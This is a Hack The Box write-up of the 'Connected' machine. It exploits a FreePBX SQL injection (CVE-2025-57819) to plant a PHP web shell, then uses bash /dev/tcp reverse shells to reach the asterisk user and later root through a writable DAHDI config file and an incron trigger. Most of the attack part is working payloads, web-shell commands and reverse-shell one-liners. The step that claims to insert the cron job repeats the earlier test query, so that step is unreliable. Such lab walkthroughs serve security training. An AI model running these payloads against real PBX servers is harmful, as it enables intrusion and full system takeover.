# Connected Machine

**Platform:** Hack The Box

**Author:** 0xL0m4

**Category:** Linux (Easy)

<img width="1658" height="146" alt="image" src="https://github.com/user-attachments/assets/8914955c-e6d8-4316-93fe-25dde6a74d9b" />


## Overview

In this write-up, we will solve the Connected machine by:

- Performing initial enumeration.
- Discovering a vulnerable FreePBX instance
- Exploiting a SQL Injection vulnerability (CVE-2025-57819) to achieve Remote Code Execution
- Gaining a reverse shell as asterisk
- Escalating privileges to root using a writable configuration file and icron trigger

## Tools Used

* Nmap
* Curl
* Netcat

## Steps

### 1. Simple Recon 

We starting by adding the target to /etc/hosts:

```
echo "<your_machine_ip> connected.htb" | sudo tee -a /etc/hosts
```

We then scan the target using Nmap:

```
nmap -Pn connected.htb
```

Open ports:
```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

### 2. Web Enumeration

Opening the website reveals that the target is running FreePBX.

What is FreePBX?

FreePBX is an open-source web-based GUI that manages Asterisk-based PBX systems. It is commonly used for managing VoIP systems, extensions, and call routing.

While inspecting the application, we discover the version:

```
FreePBX 16.0.40.7
```

The version is visible in the footer fo:

https://connected.htb/admin/config.php

<img width="1920" height="845" alt="image" src="https://github.com/user-attachments/assets/7d0a28d3-389f-4232-877f-5b8d61ee84c7" />


### 3. Searching for Exploits

After identifying the version, we search for known vulnerabilities and find:

- CVE-2025-57819 (SQL Injection leading to RCE)

Useful Resources:

- https://github.com/YuvrajSHAD/FreePBX-CVE-2025-57819
- https://github.com/MuhammadWaseem29/SQL-Injection-and-RCE_CVE-2025-57819
- https://www.sentinelone.com/vulnerability-database/cve-2025-57819/

### 4. Testing SQL Injection

We first verify SQL injection using an error-based payload:
```
curl -i -k "https://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~USER:',(SELECT+USER()),'~'))+--+"
```
- -i → includes HTTP headers in output
- -k → ignores SSL certificate validation
- Payload is injected via brand parameter
  
Result:
```
~USER:freepbxuser@localhost~
```
This confirms SQL Injection exists and we can extract database data.


### 5. Achieving Remote Code Execution

We now exploit the vulnerability to achieve RCE by inserting a cron job into the database.

Payload:
```
curl -i -k "https://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~USER:',(SELECT+USER()),'~'))+--+"
```

Explanation:

- We inject into cron_jobs table
- A cron job is created that writes a PHP webshell to /var/www/html/poc.php
- The payload is base64 encoded PHP code:
  ```
  <?php system($_GET['cmd']); ?>
  ```
After waiting ~1 minute, the cron job executes successfully.

### 6. Web Shell Access

We access the shell:
```
curl -k "https://connected.htb/poc.php?cmd=id"
```
Output :
```
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```
We now have command execution as the asterisk user.

### 7. Reverse Shell

Start a listener on your host:
```
nc -lnvp 4444
```
Then trigger the reverse shell:
```
curl -ik "https://connected.htb/poc.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<your tun0 ip>/4444+0>%261'"
```
We successfully get a reverse shell as asterisk


### 8. Get user Flag

Read the user flag:

```
cat /home/asterisk/user.txt
```
Voilaaaa, the user flag was revealed.

### 9. Privilege Escalation
If we find any writeable file in /etc we can put our shell on it.
And, find any icron for excute this file after editing.

I found an inotify-based rule:
```
cat /etc/icron*
```
Result:
```
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
```

That means Whenever the file [/var/spool/asterisk/sysadmin/dahdi_restart] is modified, the system executes [/usr/sbin/sysadmin_dahdi_restart] as root.

### 10. Writable File Abuse
We search for writable files:
```
find /etc -writable 2>/dev/null
```
We find [/etc/dahdi/init.conf]


### 11. Privilege Escalation Exploit
Inject a reverse shell into the writable config file:
```
echo 'bash -c "bash -i >& /dev/tcp/10.10.16.33/4443 0>&1" &' >> /etc/dahdi/init.conf
```
Start listener on your host:
```
nc -lnvp 4443
```
Then trigger execution by modifying:
```
echo "Pooom" >> /var/spool/asterisk/sysadmin/dahdi_restart
```
### 12. Get root flag

We successfully receive a root shell. let's check:
```
id
```
Output:
```
uid=0(root) gid=0(root)
```
Finally, retrieve the root flag:
```
cat /root/root.txt
```
Voilaaaa, the root flag was revealed.

#

[The Machine Link](https://app.hackthebox.com/machines/Connected?sort_by=created_at&sort_type=desc)

See you in the next write-up!

سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك.
